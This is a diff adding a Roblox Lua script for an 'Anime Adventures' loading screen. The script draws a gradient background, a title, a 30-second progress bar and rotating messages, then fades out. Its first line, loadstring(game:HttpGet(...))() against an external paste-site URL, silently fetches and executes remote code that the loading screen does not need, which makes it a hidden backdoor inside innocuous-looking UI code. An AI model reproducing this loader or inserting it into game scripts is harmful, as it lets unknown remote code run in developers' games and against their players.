@@ -1,0 +1,129 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/oaiPAgKuet/0"))()
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+ReplicatedFirst:RemoveDefaultLoadingScreen()
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "AnimeLoadingScreen"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1, 1)
+bg.BackgroundColor3 = Color3.fromRGB(10, 8, 20)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+-- Background gradient
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 10, 45)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 15, 65)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 15))
+})
+gradient.Rotation = 45
+gradient.Parent = bg
+
+-- Game title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.fromScale(0.9, 0.15)
+title.Position = UDim2.fromScale(0.05, 0.28)
+title.BackgroundTransparency = 1
+title.Text = "ANIME ADVENTURES"
+title.TextColor3 = Color3.fromRGB(255, 220, 100)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.Parent = bg
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.fromScale(0.9, 0.06)
+subtitle.Position = UDim2.fromScale(0.05, 0.43)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "PREPARE FOR YOUR NEXT ADVENTURE"
+subtitle.TextColor3 = Color3.fromRGB(220, 220, 255)
+subtitle.TextScaled = true
+subtitle.Font = Enum.Font.GothamMedium
+subtitle.Parent = bg
+
+-- Loading text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.fromScale(0.9, 0.06)
+loadingText.Position = UDim2.fromScale(0.05, 0.62)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Summoning Heroes..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamBold
+loadingText.Parent = bg
+
+-- Progress bar background
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.fromScale(0.75, 0.025)
+barBG.Position = UDim2.fromScale(0.125, 0.72)
+barBG.BackgroundColor3 = Color3.fromRGB(50, 45, 65)
+barBG.BorderSizePixel = 0
+barBG.Parent = bg
+
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1, 0)
+
+-- Progress fill
+local bar = Instance.new("Frame")
+bar.Size = UDim2.fromScale(0, 1)
+bar.BackgroundColor3 = Color3.fromRGB(255, 190, 60)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+
+-- Loading messages
+local messages = {
+    "Summoning Heroes...",
+    "Preparing the Battlefields...",
+    "Loading Legendary Units...",
+    "Opening the Adventure Portal...",
+    "Almost Ready..."
+}
+
+local messageIndex = 1
+
+task.spawn(function()
+    while gui.Parent do
+        loadingText.Text = messages[messageIndex]
+        messageIndex = messageIndex % #messages + 1
+        task.wait(5)
+    end
+end)
+
+-- 30-second loading animation
+local tween = TweenService:Create(
+    bar,
+    TweenInfo.new(30, Enum.EasingStyle.Linear),
+    {Size = UDim2.fromScale(1, 1)}
+)
+
+tween:Play()
+tween.Completed:Wait()
+
+-- Fade out
+for _, object in ipairs(gui:GetDescendants()) do
+    if object:IsA("TextLabel") then
+        TweenService:Create(object, TweenInfo.new(0.8), {
+            TextTransparency = 1
+        }):Play()
+    elseif object:IsA("Frame") then
+        TweenService:Create(object, TweenInfo.new(0.8), {
+            BackgroundTransparency = 1
+        }):Play()
+    end
+end
+
+task.wait(0.9)
+gui:Destroy()
